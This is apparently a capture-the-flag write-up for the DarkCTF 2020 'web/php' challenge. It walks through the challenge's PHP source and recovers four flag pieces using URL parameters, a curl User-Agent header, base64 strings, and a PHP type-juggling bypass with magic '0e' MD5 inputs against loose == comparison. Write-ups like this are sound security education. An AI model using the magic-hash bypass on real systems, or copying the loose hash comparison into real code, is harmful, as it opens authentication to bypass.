# web/php information
First lets look at the code. I posted the commented version of the server side code to this git repo.

Going through the code we can see that there are 4 main `if` statements that each return a part of the flag
flags:
- $flag
- $flag\_1
- $flag\_2
- $flag\_3

Here is a walkthrough on how to get each flag.
(flags are printed at the bottom of the page so if youre like me you might have missed that for a few mins)

### $flag
code for first flag:
```php
# is true if the url includes query's
if (!empty($_SERVER['QUERY_STRING'])) {

    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);

    # is true if darkctf is one of the query arguments
    if (!empty($res['darkctf'])){
        $darkctf = $res['darkctf'];
    }
}

# if darkctf print flag
if ($darkctf === "2020"){
    echo "<h1 style='color: chartreuse;'>Flag : $flag</h1></br>";
}
```

the server checks if there is a urlparameter called "darkctf" and if there is then assigns it to $darkctf

if darkctf="2020" we get the flag
```
http://php.darkarmy.xyz:7001/?darkctf=2020
```

result:
```
DarkCTF{
```

cool onto the second part:
### flag\_1
code for second flag:
```php
# if useragent =  "020_the_best_year_corona" print flag_1
if ($_SERVER["HTTP_USER_AGENT"] === base64_decode("MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ==")){
    echo "<h1 style='color: chartreuse;'>Flag : $flag_1</h1></br>";
}
```
our brosers useragent has to equal to base64 decoded version of "`MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ==`"

base64\_decode( "`MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ==`") = "`2020_the_best_year_corona`"

setting is easiest with the curl using the `-A flag`
```bash
curl -A "2020_the_best_year_corona" http://php.darkarmy.xyz:7001
```

result:
```
very_
```

### flag\_2
code for third flag:
```php
# is true if the url includes query's
if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);

    # if ctf2020 is set
    if (!empty($res['ctf2020'])){
        $ctf2020 = $res['ctf2020'];
    }

    # if ctf2020 is equal to ""
    if ($ctf2020 === base64_encode("ZGFya2N0Zi0yMDIwLXdlYg==")){
        echo "<h1 style='color: chartreuse;'>Flag : $flag_2</h1></br>";
                
        }
    }
```
at fist glance it looks like the first flag. you need to set urlparameter ctf2020 to a string, but there is a catch, its `base64\_encode` and not `decode` so the actual string is "`WkdGeWEyTjBaaTB5TURJd0xYZGxZZz09`"


```
http://php.darkarmy.xyz:7001/?ctf2020=WkdGeWEyTjBaaTB5TURJd0xYZGxZZz09
```

result:
```
nice
```


### flag\_3
code for fourth flag:
```php
# true if url param "karma" and "2020" is set
if (isset($_GET['karma']) and isset($_GET['2020'])) {

    # karma and 2020 cant equal each other
    if ($_GET['karma'] != $_GET['2020'])

    # yet their hash does
    if (md5($_GET['karma']) == md5($_GET['2020']))
        echo "<h1 style='color: chartreuse;'>Flag : $flag_3</h1></br>";
    else
        echo "<h1 style='color: chartreuse;'>Wrong</h1></br>";
}
```
overview:
- we need to set both 'karma' and '2020'
- 'karma' and '2020' cannot equal each other
- md5($karma) has to equal md5($2020)

notice that when coparing the md5 of the two strings only `==` is used and not `===` this is called a non-strict comparison and leads to some interesting php bugs involving type juggling, [this document explains it well](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)


when we use non-strict comparison ( == ) php will attempt to guess the type of the value before comparing them.  This leads to weird stuff happening, eg: any string starting with `"0e"` will be evaluated as `0`

```bash
$ echo -n 240610708 | md5sum
0e462097431906509019562988736854  -

$ echo -n QNKCDZO | md5sum
0e830400451993494058024219903391  -
```
two completely different strings that both start with "0e" will equal to each other because php things they are both 0
```
http://php.darkarmy.xyz:7001/?karma=240610708&2020=QNKCDZO
```

result:
```
_web_challenge_dark_ctf}
```


# flag
```
DarkCTF{very_nice_web_challenge_dark_ctf}
```




